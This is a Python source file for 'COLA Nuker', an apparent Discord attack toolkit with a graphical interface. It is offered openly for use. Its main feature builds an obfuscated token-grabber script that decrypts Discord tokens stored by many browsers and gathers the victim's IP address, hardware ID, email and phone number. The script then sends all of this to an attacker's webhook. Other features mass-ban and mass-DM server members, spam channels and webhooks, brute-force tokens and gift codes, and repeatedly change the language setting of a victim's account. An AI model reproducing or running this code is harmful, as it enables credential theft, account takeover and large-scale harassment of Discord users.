import os
os.system("cls")
from ctypes import FormatError
from colorama import init, Fore
import tkinter
import sys
from tkinter import messagebox, filedialog
import subprocess
import time
import random
from datetime import datetime
import string
from pathlib import Path
import requests
import shutil
import base64
from base64 import *
import platform
from urllib.request import Request, urlopen
import time
from time import sleep
import nextcord.ext
import nextcord
from nextcord.ext import commands
from customtkinter import *
import json
import customtkinter as customtkinter
from discord_webhook import DiscordWebhook, DiscordEmbed
now = datetime.now()
lt = now.strftime("%H:%M:%S")
os.system("cls")
def clear():
    os.system("cls")
import configparser

config = configparser.ConfigParser()
config.read_file(open(r'app\\config.cfg'))
path1 = config.get('app', 'mode')
if path1 == "dark":
    customtkinter.set_appearance_mode("dark")
elif path1 == "light":
    customtkinter.set_appearance_mode("light")
else:
    customtkinter.set_appearance_mode("system")
def fchn():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Bot-Token", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    bottkk = pathhh.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.spamchannels *name*
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def spamchannels(ctx, namef=None):
        guild = ctx.message.guild
        if namef == None:
            namef = "cola-nuker"
        else:
            pass
        for i in range(99999999999):
            await guild.create_text_channel(name=f'{namef}')
    bot.run(bottkk)


def nitrg():
    messagebox.showinfo("showinfo", "The chance of getting a valid code is ALMOST impossible. It could take weeks!")
    os.system("cls")
    filetypes = (
        ('text files', '*.txt'),
    )

    path = filedialog.askopenfilename(
        title='Select a file to save valid codes to!',
        initialdir='/',
        filetypes=filetypes)
    def looop():
        for z in range(999999999999999999999):
            code = ('').join(random.choices(string.ascii_letters + string.digits, k=16))
            r = requests.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true")
            if r.status_code == 200:
                f = open(path, "a")
                f.write(f"Tries: {z} // valid - discord.gift/{code}\n\n")
                f.close()
            else:
                pass
            print(f"[{z} Codes Checked / Valid codes will be saved to {path}]")
        looop()
    looop()








def tkg():
    pathh = customtkinter.CTkInputDialog(text="Enter Filename", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    filename = pathhh.strip()
    pathh = customtkinter.CTkInputDialog(text="Enter Webhook", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    webhooklink = pathhh.strip()
    f = open(r"output\\" + filename + ".py", "w")
    f.write("""from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests, json, os
from datetime import datetime
tokens = []
cleaned = []
checker = []
def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def get_token():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
    paths = {
        'Discord': roaming + '\\\\discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Lightcord': roaming + '\\\\Lightcord',
        'Discord PTB': roaming + '\\\\discordptb',
        'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
        'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
        'Amigo': local + '\\\\Amigo\\\\User Data',
        'Torch': local + '\\\\Torch\\\\User Data',
        'Kometa': local + '\\\\Kometa\\\\User Data',
        'Orbitum': local + '\\\\Orbitum\\\\User Data',
        'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
        '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
        'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
        'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
        'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
        'Chrome': chrome + 'Default',
        'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
        'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
        'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
        'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
        'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + f"\\\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
            if not file.endswith(".ldb") and file.endswith(".log"): continue
            else:
                try:
                    with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                        for x in files.readlines():
                            x.strip()
                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*", x):
                                tokens.append(values)
                except PermissionError: continue
        for i in tokens:
            if i.endswith("\\\\"):
                i.replace("\\\\", "")
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError == "Error": continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except: continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f\"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Blizz#8810 (inspired by astraadev)* **|** ||https://github.com/LuyaTools/||\"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Blizz & Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except: continue
                else: continue
if __name__ == '__main__':
    get_token()""".replace("~~WEBHOOK_URL~~", webhooklink))
    f.close()
    f = open(r"output\\" + filename + ".py", "r")
    mysrc = f.read()
    def obf():
        src = r"output\\" + filename + ".py"
        marsrc = compile(mysrc, 'coduter', 'exec')
        encode1 = marshal.dumps(marsrc)
        encode2 = zlib.compress(encode1)
        encode7 = lzma.compress(encode2)
        encode3 = base64.b64encode(encode7)
        encode6 = base64.b85encode(encode3)
        symbol = '__COLA_WALL' *75
        with open(src, 'r',errors='ignore') as e:
            MONKEYHAHA = e.read()
        with open(src, 'w') as f:
            f.write(symbol+f"='{symbol}'\n")
            f.write("import base64, marshal, zlib, lzma\n")
            f.write(symbol+f"='{symbol}'\n")
            f.write("\n"+symbol+f"='{symbol}'\n")
            f.write("\n"+MONKEYHAHA)
            f.write("\n"+symbol+f"='{symbol}'\n")
        b64 = lambda _monkay : base64.b64encode(_monkay)
        mar = lambda _monkay : marshal.dumps(compile(_monkay,'<x>','exec'))
        zlb = lambda _monkay : zlib.compress(_monkay)
        OFFSET = 100
        symbol = '__CODEIN_CODEIN' * 50
        with open(src, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
        b64_content = base64.b64encode(content.encode()).decode()
        index = 0
        code = f'{symbol} = ""\n'
        for _ in range(int(len(b64_content) / OFFSET) +1):
            _str = ''
            for char in b64_content[index:index + OFFSET]:
                byte = str(hex(ord(char)))[2:]
                if len(byte) < 2:
                    byte = '0' + byte
                _str += '\\x' + str(byte)
            code += f'{symbol} += "{_str}"\n'
            index += OFFSET
        code2 =  f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({symbol}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
        for x in range(5):
            method = repr(b64(zlb(mar(code2.encode('utf8'))))[::-1])
            data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
        z = []
        for i in data:
            z.append(ord(i))
        beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
        marsrc = compile(beforemarsh, 'coduter', 'exec')
        obfmarsh = marshal.dumps(marsrc)
        print(f"{w}┌───[{r}COLA{w}] Starting Obfuscator...")
        now = datetime.now()
        ct = now.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added Marshal..")
        obfzlib = zlib.compress(obfmarsh)
        time.sleep(0.2)
        now2 = datetime.now()
        ct = now2.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added zlib..")
        obflzma = lzma.compress(obfzlib)
        now3 = datetime.now()
        ct = now3.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added lzma..")
        obfbase64 = base64.b64encode(obflzma)
        time.sleep(0.1)
        now4 = datetime.now()
        ct = now4.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added base64..")
        obfbase16 = base64.b16encode(obfbase64)
        now5 = datetime.now()
        ct = now5.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added base16..")
        obfbase32 = base64.b32encode(obfbase16)
        time.sleep(0.5)
        now6 = datetime.now()
        ct = now6.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added base32..")
        obfbase85 = base64.b85encode(obfbase32)
        now7 = datetime.now()
        ct = now7.strftime("%H:%M:%S")
        print(f"{w}│ [{r}COLA{w}] [{r}{ct}{w}] {r}Added base85..")
        code += f'exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b16decode(base64.b32decode(base64.b85decode({obfbase85}))))))))'
        with open(src, 'w+',errors='ignore') as f:
            f.write("import marshal, zlib, base64, lzma\n")
            f.write(code)
            f.write(f"\n{symbol} = '{symbol}'")
        print(f"{w}└───[{r}COLA{w}] SUCCESS: Encrypted Token Grabber generated in the output folder!")
        time.sleep(10)
        os.system("cls")
    obf()










def massdm():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Bot-Token", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    bottkk = pathhh.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.massdm *message*

    NOTE: This will message all (possible) members on a server via dm
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def massdm(ctx, namefx=None):
        if namefx == None:
            namefx = "Someone just MassDMed you with https://github.com/LuyaTools/cola-discord-nuker"
        else:
            pass
        for i in range(99999999999):
            members = ctx.guild.members
            for member in members:
                try:
                    await member.send(namefx)
                    print("[cola] +1 dm sent")
                
                except:
                    print("Could dm 1 user!")
    bot.run(bottkk)


def cln():
    pathh = customtkinter.CTkInputDialog(text="Enter Target-Token", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    tkn = pathhh.strip()
    pathh = customtkinter.CTkInputDialog(text="Enter amount of rounds", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    amt = pathhh.strip()
    headers = {'Authorization': tkn, 'Content-Type': 'application/json'}
    r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
    if r.status_code == 200:
        for i in range(int(amt)):
            print(f"""cola > ({i}) Language has been changed""")
            setting = {'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN', 'th', 'uk', 'ru', 'el', 'cs'])}
            requests.patch("https://discord.com/api/v7/users/@me/settings", headers=headers, json=setting)
            time.sleep(1)

def delw():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Webhook", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    xnf = pathhh.strip()
    try:
        requests.delete(xnf.rstrip())
        tkinter.messagebox.showinfo(title="COLA Nuker", message="Webhook deleted!")
    except:
        tkinter.messagebox.showerror(title="COLA Nuker", message="Webhook could not be deleted!")
def getin():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-User-Token to check", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    tikk = pathhh.strip()
    headr1 = {
    'Authorization': f'{tikk}',
    'Content-Type': 'application/json'
    }
    res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headr1)
    if res.status_code == 200:
        print("")
        pass
    else:
        print("Token Invalid!")
        time.sleep(2)
        sys.exit()
    res_json = res.json()
    user = f'{res_json["username"]}#{res_json["discriminator"]}'
    uid = res_json['id']
    user_id = uid
    avatar_id = res_json['avatar']
    avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
    pnum = res_json['phone']
    email = res_json['email']
    mfa_enabled = res_json['mfa_enabled']
    flags = res_json['flags']
    lang = res_json['locale']
    verified = res_json['verified']
    app2.withdraw()
    label = customtkinter.CTkLabel(master=app3, text=f"""
Token: {tikk}
Username: {user}
User-ID: {uid}
Avatar-ID: {avatar_id}
Avatar-URL: {avatar_url}
Phone-Number: {pnum}
Email: {email}
2FA: {mfa_enabled}
Flags: {flags}
Language: {lang}
Verified: {verified}
    """)
    label.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    app3.mainloop()

w = Fore.WHITE
r = Fore.RED
def tkbr():
    app2.withdraw()
    os.system("cls")
    print("For a paid Token-Bruteforcer (To support me <3), visit:\n- My discord: https://discord.gg/ma3vc6ZysW\n- My Website: https://blizz.cf/\n")
    id_to_token = base64.b64encode((input(f"{w}[{r}COLA{w}] User-ID: ")).encode("ascii"))
    id_to_token = str(id_to_token)[2:-1]
    amt = input(f"{w}[{r}COLA{w}] Amount: ")
    for i in range(int(amt)):
        token = id_to_token + '.' + ('').join(random.choices(string.ascii_letters + '-' + string.digits, k=5)) + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        headerss = {
            'Authorization': token
        }
        login = requests.get('https://discordapp.com/api/v9/auth/login', headers=headerss)
        if login.status_code == 200:
            print(Fore.GREEN + f'[{i}] VALID: {token}')
            time.sleep(10000)
            input()
        else:
            print(Fore.RED + f'[{i}] INVALID' + ' ' + token)
            time.sleep(1)




def banm():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Bot-Token", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    bottk = pathhh.strip()
    print(f"""
    ===================================================================
    Bot: {bottk}
    Command:       cola.massban *reason*

    NOTE: This will ban all members possible
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def massban(ctx, reason=None):
        if reason == None:
            reason = "Nuked with Cola Nuker - https://github.com/LuyaTools/cola-discord-nuker"
        members = ctx.guild.members
        for member in members:
            try:
                await member.ban(reason=reason)
            except nextcord.Forbidden:
                print(f"{member.name} has FAILED to be banned from server")
            else:
                print(f"{member.name} has been banned from server")
    bot.run(bottk)

def ddd():
    tkinter.messagebox.showerror(title="Cola", message="This option is not released yet!")


def spweb():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Webhook", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    webhh = pathhh.strip()
    pathh = customtkinter.CTkInputDialog(text="Enter Message", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    for i in range(99999999):
        webhook = DiscordWebhook(url=webhh)
        embed = DiscordEmbed(title='', description=f'{pathhh}')
        embed.set_footer(text='Spammed via COLA-NUKER - https://github.com/LuyaTools', icon_url='https://golfclub-isernhagen.de/wp-content/uploads/2018/09/coca-cola-logo-260x260.png')
        webhook.add_embed(embed)
        response = webhook.execute()


from pathlib import Path
import marshal, zlib, base64, lzma
r = Fore.RED
w = Fore.WHITE
def pyobf():
    app2.withdraw()
    print("credits to Vesper#0003")
    filetypes = (
        ('Python Files', '*.py'),
    )

    src = filedialog.askopenfilename(
        title='Select Python-File to obfuscate',
        initialdir='/',
        filetypes=filetypes)
    path = Path(src)
    if path.is_file():
        print(f"{w}[{r}COLA-OBFUSCATOR{w}] SUCCESS: Found file! Checking...")
    else:
        print(f"{w}[{r}COLA-OBFUSCATOR{w}] ERROR: Not a Python file!")
        time.sleep(5)
        sys.exit()
    with open(src, 'r',errors='ignore') as f:
        if src.endswith('.py'):
            print(f"{w}[{r}COLA-OBFUSCATOR{w}] SUCCESS: File is a Python-File! Starting Obfuscation...")
        else:
            print(f"{w}[{r}COLA-OBFUSCATOR{w}] ERROR: Not a Python file!")
            time.sleep(5)
            sys.exit()
        mysrc = f.read()
    marsrc = compile(mysrc, 'coduter', 'exec')
    encode1 = marshal.dumps(marsrc)
    encode2 = zlib.compress(encode1)
    encode7 = lzma.compress(encode2)
    encode3 = base64.b64encode(encode7)
    encode6 = base64.b85encode(encode3)
    symbol = '__COLA_WALL' *75
    with open(src, 'r',errors='ignore') as e:
        MONKEYHAHA = e.read()
    with open(src, 'w') as f:
        f.write(symbol+f"='{symbol}'\n")
        f.write("import base64, marshal, zlib, lzma\n")
        f.write(symbol+f"='{symbol}'\n")
        f.write("\n"+symbol+f"='{symbol}'\n")
        f.write("\n"+MONKEYHAHA)
        f.write("\n"+symbol+f"='{symbol}'\n")
    b64 = lambda _monkay : base64.b64encode(_monkay)
    mar = lambda _monkay : marshal.dumps(compile(_monkay,'<x>','exec'))
    zlb = lambda _monkay : zlib.compress(_monkay)
    OFFSET = 100
    symbol = '__COLA_COLA' * 50
    with open(src, 'r', encoding='utf-8', errors='ignore') as file:
        content = file.read()
    b64_content = base64.b64encode(content.encode()).decode()
    index = 0
    code = f'{symbol} = ""\n'
    for _ in range(int(len(b64_content) / OFFSET) +1):
        _str = ''
        for char in b64_content[index:index + OFFSET]:
            byte = str(hex(ord(char)))[2:]
            if len(byte) < 2:
                byte = '0' + byte
            _str += '\\x' + str(byte)
        code += f'{symbol} += "{_str}"\n'
        index += OFFSET
    code2 =  f'exec(__import__("\\x62\\x61\\x73\\x65\\x36\\x34").b64decode({symbol}.encode("\\x75\\x74\\x66\\x2d\\x38")).decode("\\x75\\x74\\x66\\x2d\\x38"))'
    for x in range(5):
        method = repr(b64(zlb(mar(code2.encode('utf8'))))[::-1])
        data = "exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(%s[::-1]))))" % method
    z = []
    for i in data:
        z.append(ord(i))
    beforemarsh ="_ = %s\nexec(''.join(chr(__) for __ in _))" % z
    marsrc = compile(beforemarsh, 'coduter', 'exec')
    obfmarsh = marshal.dumps(marsrc)
    print(f"{w}[{r}+{w}] {r}Added Marshal..")
    obfzlib = zlib.compress(obfmarsh)
    print(f"{w}[{r}+{w}] {r}Added zlib..")
    obflzma = lzma.compress(obfzlib)
    print(f"{w}[{r}+{w}] {r}Added lzma..")
    obfbase64 = base64.b64encode(obflzma)
    print(f"{w}[{r}+{w}] {r}Added base64..")
    obfbase16 = base64.b16encode(obfbase64)
    print(f"{w}[{r}+{w}] {r}Added base16..")
    obfbase32 = base64.b32encode(obfbase16)
    print(f"{w}[{r}+{w}] {r}Added base32..")
    obfbase85 = base64.b85encode(obfbase32)
    print(f"{w}[{r}+{w}] {r}Added base85..")
    code += f'exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b16decode(base64.b32decode(base64.b85decode({obfbase85}))))))))'
    with open(src, 'w+',errors='ignore') as f:
        f.write("import marshal, zlib, base64, lzma\n")
        f.write(code)
        f.write(f"\n{symbol} = '{symbol}'")
    print(f"{w}[{r}COLA-OBFUSCATOR{w}] SUCCESS: Successfully updated your file. Encrypted & Walls Added")

def lm():
    customtkinter.set_appearance_mode("light")
def dm():

    customtkinter.set_appearance_mode("dark")


def spammm():
    pathh = customtkinter.CTkInputDialog(text="Enter Discord-Bot-Token", title="COLA", button_fg_color="#ff0000", button_hover_color="#000000", entry_border_color="#ff0000", entry_text_color="#ff0000")
    pathhh = pathh.get_input()
    bottkk = pathhh.strip()
    print(f"""
    ===================================================================
    Bot: {bottkk}
    Command:       cola.spammsg *message*
    ===================================================================
    """)
    intents = nextcord.Intents.all()
    bot = commands.Bot(command_prefix='cola.', intents=intents)
    @bot.command()
    async def spammsg(ctx, msg=None):
        if msg == None:
            await ctx.reply(message="`error: no message set`")
        else:
            pass
        for i in range(99999999999):
            await ctx.send(f"{msg}")
    bot.run(bottkk)

def home():
    app.withdraw()
    app2.iconbitmap("app\icon.ico")
    clear()
    bel2 = customtkinter.CTkLabel(master=app2, text="COLA NUKER", text_color="#ff0000", font=('Calibri', 20))
    bel2.place(relx=0.5, rely=0.1, anchor=tkinter.CENTER)
    bel3 = customtkinter.CTkLabel(master=app2, text="https://blizz.cf/\nhttps://github.com/LuyaTools\nhttps://t.me/bladetools", text_color="#ff0000", font=('Calibri', 15))
    bel3.place(relx=0.5, rely=0.9, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="TokenGrabber",
                                 command=tkg)
    button.place(relx=0.68, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Py Obfuscator",
                                 command=pyobf)
    button.place(relx=0.86, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Delete Webhook",
                                 command=delw)
    button.place(relx=0.68, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Nitro Gen",
                                 command=nitrg)
    button.place(relx=0.68, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Ban All Members",
                                 command=banm)
    button.place(relx=0.86, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Get Info",
                                 command=getin)
    button.place(relx=0.86, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Messages",
                                 command=spammm)
    button.place(relx=0.5, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="MassDM",
                                 command=massdm)
    button.place(relx=0.32, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Change Lang",
                                 command=cln)
    button.place(relx=0.32, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Status",
                                 command=ddd)
    button.place(relx=0.32, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Token Bruteforcer",
                                 command=tkbr)
    button.place(relx=0.14, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="MassBlock",
                                 command=ddd)
    button.place(relx=0.14, rely=0.2, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Webhooks",
                                 command=spweb)
    button.place(relx=0.14, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#ff0000",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Channels",
                                 command=fchn)
    button.place(relx=0.5, rely=0.3, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=120,
                                 height=32,
                                 fg_color="#4f4f4f",
                                 hover_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Spam Settings",
                                 command=ddd)
    button.place(relx=0.5, rely=0.4, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=100,
                                 height=32,
                                 hover_color="#ff0000",
                                 fg_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Darkmode",
                                 command=dm)
    button.place(relx=0.4, rely=0.8, anchor=tkinter.CENTER)
    button = customtkinter.CTkButton(master=app2,
                                 width=100,
                                 height=32,
                                 hover_color="#ff0000",
                                 fg_color="#000000",
                                 border_width=0,
                                 corner_radius=8,
                                 text="Lightmode",
                                 command=lm)
    button.place(relx=0.6, rely=0.8, anchor=tkinter.CENTER)


    bel32 = customtkinter.CTkLabel(master=app2, text="More coming soon!", text_color="#ff0000", font=('Calibri', 40))
    bel32.place(relx=0.5, rely=0.7, anchor=tkinter.CENTER)

    app2.mainloop()

os.system("title Cola Nuker [LOG]")
os.system("color c")
app = customtkinter.CTk()
app.geometry(f"{600}x{500}")
app.resizable(width=False, height=False)
app.title("COLA Nuker")

app2 = customtkinter.CTk()
app2.resizable(width=False, height=False)
app2.geometry(f"{800}x{500}")
app2.title(f"COLA Nuker - Dashboard")

app3 = customtkinter.CTk()
app3.resizable(width=False, height=False)
app3.geometry(f"{800}x{500}")
app3.title("COLA Nuker - Tokeninfo")

app4 = customtkinter.CTk()
app4.resizable(width=False, height=False)
app4.geometry(f"{600}x{300}")
app4.title("COLA Nuker - Grabber Builder")

customtkinter.set_appearance_mode("dark")

uun = "https://blizz.cf/tools/colanuker/version"
fxc = requests.get(uun)
fxct = fxc.text
ver = "1.0.5"

os.system("cls")
if fxct == ver:
    app.iconbitmap("app\icon.ico")
    clear()
    bel = customtkinter.CTkLabel(master=app, text="Thanks for using", text_color="#ffffff")
    bel.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
    bel2 = customtkinter.CTkLabel(master=app, text="COLA NUKER", text_color="#ff0000", font=('Calibri', 20))
